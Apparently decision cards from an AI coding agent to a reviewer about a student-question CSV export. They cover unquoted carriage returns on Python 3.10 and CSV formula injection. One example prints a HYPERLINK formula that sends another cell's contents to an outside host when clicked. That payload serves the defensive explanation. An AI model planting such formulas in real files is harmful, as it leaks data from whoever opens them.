Card 1. A lone carriage return (\r) is not quoted on CI's Python

What is wrong. Decisions says two things that disagree in one case: "a field is wrapped in double quotes only if it contains a comma, a double quote or a line break", and "Quoting is Python's csv module default". CI runs Python 3.10 (UV_PYTHON: "3.10" in ci.yml). On 3.10, csv.writer(buf, lineterminator="\n") does not quote a field holding a bare \r; on 3.11, 3.12 and 3.13 it does. Builder says: I ran all four versions

Example from this codebase. ask_question only strips the ends of the text, so a question pasted as Line one\rline two is stored with the \r inside. On CI's Python the export row comes out as:

5,Ada,2026-03-01T09:20:00,Line one\rline two,

A spreadsheet treats that \r as a new row, so the row splits in two and every column after it shifts. On Python 3.11+ the same call gives "Line one\rline two" (quoted, safe). So the same code gives different files depending on the Python version.

A (recommended). Quote any field that holds \r or \n, on every Python version. Text stays exactly as stored. Matches the "line break" rule and what Python 3.11+ does already. Before (3.10): Line one\rline two → after: "Line one\rline two". Every other case, including the worked example, is byte-for-byte unchanged.
Amended Decisions line: "… a field is wrapped in double quotes only if it contains a comma, a double quote or a line break (\n or \r), on every supported Python version; this is csv.writer's default on Python 3.11+."
Then: I build it with a test named for it that runs on CI's 3.10.
B. Keep "whatever csv.writer does" literally. Simplest code (the three lines in the Notes). Before and after: on 3.10 a bare \r stays unquoted and can split a row.
Then: I build as written and list the \r case under "Not handled" in the merge brief.

Card 2. Student text that starts with = runs as a formula in the teacher's spreadsheet

What the contract misses. The export holds text typed by students, and the whole point is that teachers open it in a spreadsheet. Excel and Google Sheets treat a cell that starts with =, +, - or @ as a formula (known as "CSV injection"). The contract says the question column is the text as stored, so the export passes it straight through.

Example. A student in Biology asks =HYPERLINK("https://example.com/?"&B2,"Click for the answer"). Today's contract exports:

5,Ada,2026-03-01T09:20:00,"=HYPERLINK(""https://example.com/?""&B2,""Click for the answer"")",

Opened in a spreadsheet, that cell is a live link that would send another cell's contents (here a student's name) to an outside site when clicked. Most spreadsheets show a warning for the worst forms, but not for all.

A (recommended). Build as signed now; I draft a follow-up issue for you to approve at Stop 2. The export is exact text, so it is honest about what students typed and keeps this ticket to its scope. The risk exists only once a teacher opens the file in a spreadsheet, and the fix choice (prefix with ', or warn) deserves its own triage.
Then: the merge brief names this risk and shows the follow-up issue text for your yes.
B. Neutralise it in this ticket. Any field starting with =, +, -, @, tab or \r gets a leading '. Before: =HYPERLINK(...) → after: '=HYPERLINK(...). Cost: a genuine question like -5 squared? exports as '-5 squared?, and the Decisions line "question = the question text" changes.
Amended Decisions line: "Any field whose first character is = + - @, tab or \r is prefixed with a single quote '."
Then: I build it with a test per prefix character.
